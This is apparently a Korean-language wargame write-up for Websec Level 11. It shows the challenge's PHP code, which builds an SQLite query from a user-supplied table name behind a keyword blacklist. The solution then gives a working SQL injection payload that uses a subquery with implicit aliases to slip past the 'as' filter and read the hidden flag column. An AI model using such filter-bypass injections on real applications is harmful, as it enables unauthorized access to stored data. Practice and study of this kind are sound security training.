---
title : "Websec - Level 11"
categories : [Wargame, Websec]
tags: [SQLi]
---

## Level 11
<hr style="border-top: 1px solid;"><br>

``` php
function sanitize($id, $table) {
    if (! is_numeric ($id) or $id < 2) {
        exit("The id must be numeric, and superior to one.");
    }

    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "*", "+", "-"];
    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]"];
    $special3 = ["^", "_", "`", "{", "|", "}"];
    $sql = ["union", "0", "join", "as"];
    $blacklist = array_merge ($special1, $special2, $special3, $sql);
    foreach ($blacklist as $value) {
        if (stripos($table, $value) !== false)
            exit("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id']) && isset ($_POST['table'])) {
    $id = $_POST['user_id'];
    $table = $_POST['table'];

    sanitize($id, $table);

    $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
    $query = 'SELECT id,username FROM ' . $table . ' WHERE id = ' . $id;
    //$query = 'SELECT id,username,enemy FROM ' . $table . ' WHERE id = ' . $id; // enemy에 flag값이 들어있다.

    $getUsers = $pdo->query($query);
    $users = $getUsers->fetchArray(SQLITE3_ASSOC);

    $userDetails = false;
    if ($users) {
        $userDetails = $users;
    $userDetails['table'] = htmlentities($table);
    }
}

The hero number <strong><?php echo $userDetails['id']; ?></strong>
in <strong><?php echo $userDetails['table']; ?></strong>
is <strong><?php echo $userDetails['username']; ?></strong>.
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

문제 설명을 보면 AS가 강조되어 있다고 함. 

as는 별명을 붙여줄 때 사용하는데 as가 없어도 별명을 붙일 수 있음. 

table 부분에 서브쿼리를 줘서 플래그 값을 볼 수 있음.  

<br>

```(select 2 id,enemy username from costume where id like 1)```을 table 값으로, id값으로 2를 주면 플래그가 나옴.  

<br>

```sql
SELECT id,username FROM (select 2 id,enemy username FROM costume where id like 1) WHERE id = 2  
```

<br>

```select 2 id,enemy username from costume where id like 1```

위 쿼리문으로 보면 id 값에는 2가 들어가게 되고 **enemy 값이 username 컬럼명으로 바뀌어서 출력이 되므로 username 부분에서 플래그가 나옴**. 

<br><br>
<hr style="border: 2px solid;">
<br><br>
